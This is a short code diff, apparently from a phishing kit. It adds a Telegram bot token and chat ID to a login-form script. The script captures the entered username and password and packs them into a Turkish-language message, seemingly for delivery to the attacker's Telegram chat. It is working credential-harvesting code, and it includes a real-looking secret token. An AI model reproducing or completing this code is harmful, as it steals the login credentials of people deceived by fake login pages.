@@ -5,8 +5,8 @@ document.querySelector('.login-form').addEventListener('submit', function(event)
     const password = document.querySelector('input[type="password"]').value;
 
    
-    const botToken = '';
-    const chatId = ''; 
+    const botToken = '7257816268:AAFAwFDJ9C4657eIqcNXeuQqewmxd9gZjr8';
+    const chatId = '5778953229'; 
     const message = `Kullanıcı adı: ${username}\nŞifre: ${password}`; 
 
     
